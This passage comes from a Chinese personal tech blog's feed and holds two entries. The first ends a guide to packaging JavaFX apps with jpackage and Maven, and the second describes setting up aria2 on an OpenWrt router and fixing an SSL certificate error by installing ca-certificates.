alt="image-20200506102742159"></p><p>细心的同学会发现一个问题，那就是我们手动打包的exe文件对比通过jre打包的文件，体积会小很多。这怎么办呢？</p><p>回想一下，为什么我们要通过插件来打包，<strong>因为我们不想手动找各个模块的依赖路径</strong>。换句话说，只要我能够方便的获取模块的依赖路径就好了。</p><p>好，那怎么办呢？</p><p>其实通过maven+debug就好了。再次在target目录下打开terminal：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean -X javafx:jlink</span><br></pre></td></tr></table></figure><p>-X打开debug。最后会得到：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506103403094.png" alt="image-20200506103403094"></p><p>这就是我们的依赖路径了，提取出来，再手动执行jpackage就ok了。</p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9vcGVuamRrLmphdmEubmV0L2plcHMvMzQz" title="https://openjdk.java.net/jeps/343">JEP 343: Packaging Tool (Incubator)<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXR6NDExcTdRMT9wPTQ=" title="https://www.bilibili.com/video/BV1tz411q7Q1?p=4">JavaFX环境搭建&amp;部署打包<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kem9uZS5jb20vYXJ0aWNsZXMvYS1icmllZi1leGFtcGxlLXVzaW5nLXRoZS1lYXJseS1hY2Nlc3MtanBhY2thZ2UtdXQ=" title="https://dzone.com/articles/a-brief-example-using-the-early-access-jpackage-ut">Brief Example Using the Early Access jpackage Utility<i class="fa fa-external-link"></i></span></li></ul><p>总算是写完了，从学习modular到遇到各种坑，花了差不多整整一天，就为了打包javafx。总体来说，jpackage还不算成熟，仍有些bug，比如为什么一定要添加vendor，又如为什么–win-menu一定要和–win-menu-group配套。但总体来说能使用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;jpackage是java 14里面自带的打包工具，jpackage解决了java开发过程中得一个难题：分发自己的程序，需要客户电脑中已安装jre环境。有了jpackage，我们可以直接将java程序打包成安装包，具体来说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows：exe，msi&lt;/li&gt;
&lt;li&gt;Mac：dmg，pkg&lt;/li&gt;
&lt;li&gt;Linux：deb，rpm&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;jpackage目前并不成熟，但是也算是可以使用。另外，虽然jpackage可以打包各个系统的安装包，但是在一个系统上只能打对应系统的安装包。比如在windows上，就只能打成exe或msi。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://www.ravenxrz.ink/categories/Java/"/>
    
    
      <category term="jpackage" scheme="https://www.ravenxrz.ink/tags/jpackage/"/>
    
  </entry>
  
  <entry>
    <title>潘多拉（openwrt）aria2使用记录</title>
    <link href="https://www.ravenxrz.ink/archives/4014c94e.html"/>
    <id>https://www.ravenxrz.ink/archives/4014c94e.html</id>
    <published>2020-05-02T14:04:30.000Z</published>
    <updated>2020-09-06T07:37:36.783Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-配置"><a href="#1-配置" class="headerlink" title="1. 配置"></a>1. 配置</h2><p>首先通过ssh连接路由器，然后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br></pre></td></tr></table></figure><p>接着在软件包管理中搜索aria2:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502221329438.png" alt="image-20200502221329438"></p><p>安装以上三个包。刷新页面，就可以在服务下发现关于aria2的UI：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502221414909.png" alt="image-20200502221414909"></p><p>然后就是看自己的需求进行配置了。</p><p>一般来说，主要需要修改：</p><ul><li>文件下载目录</li><li>服务器连接数&amp;线程数</li><li>如果要用bt下载的话，需要更新tracker。tracker可以从这里拿：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25nb3NhbmcvdHJhY2tlcnNsaXN0" title="https://github.com/ngosang/trackerslist">https://github.com/ngosang/trackerslist<i class="fa fa-external-link"></i></span></li></ul><p>aria2开启后，点击：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502221558331.png" alt="image-20200502221558331"></p><p>进入后台管理界面，然后就可以愉快的下载文件了。</p><p>在路由器上使用aria下载文件时，遇到了这样的问题：</p><h2 id="2-问题"><a href="#2-问题" class="headerlink" title="2. 问题"></a>2. 问题</h2><p>[SocketCore.cc:1015] errorCode=1 SSL/TLS handshake failure: unable to get local issuer certificate</p><p>其实就是因为没有证书，所以无法下载https文件。</p><p>下载安装<code>ca-certificates</code>即可。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502220639345.png" alt="image-20200502220639345"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-配置&quot;&gt;&lt;a href=&quot;#1-配置&quot; class=&quot;headerlink&quot; title=&quot;1. 配置&quot;&gt;&lt;/a&gt;1. 配置&lt;/h2&gt;&lt;p&gt;首先通过ssh连接路由器，然后执行&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table
      
    
    </summary>
    
    
      <category term="路由器" scheme="https://www.ravenxrz.ink/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
    
      <category term="aria2" scheme="https://www.ravenxrz.ink/tags/aria2/"/>
    
  </entry>
  
</feed>
